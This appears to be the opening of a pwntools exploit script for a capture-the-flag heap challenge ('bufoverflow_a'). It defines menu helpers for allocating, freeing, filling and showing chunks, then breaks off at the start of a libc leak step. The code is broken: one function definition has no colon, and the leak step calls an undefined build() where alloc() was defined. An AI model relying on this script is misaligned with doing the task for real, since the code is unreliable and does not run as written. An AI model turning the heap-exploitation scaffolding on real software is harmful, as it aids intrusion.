from pwn import *

DEBUG=1

p=process('./bufoverflow_a')
elf=ELF('./libc.so.6')

if DEBUG == 1:
  context.log_level='debug'
  gdb.attach(p)

def sd(content):
  p.send(content)

def sl(content):
  p.sendline(content)

def rv(content)
  p.recvuntil(content)

def alloc(size):
  rv('>> ')
  sl('1')
  rv('Size: ')
  sl(str(size))

def delete(index):
  rv('>> ')
  sl('2')
  rv('Index: ')
  sl(str(index))
  
def fill(content):
  rv('>> ')
  sl('3')
  rv('Content: ')
  sd(content)

def show():
  rv('>> ')
  sl('4')
  

#---------------------------
# leak, leak, step the first
build(0x200)
build(0x200)
build(0x200)
build(0x200)
delete(1)


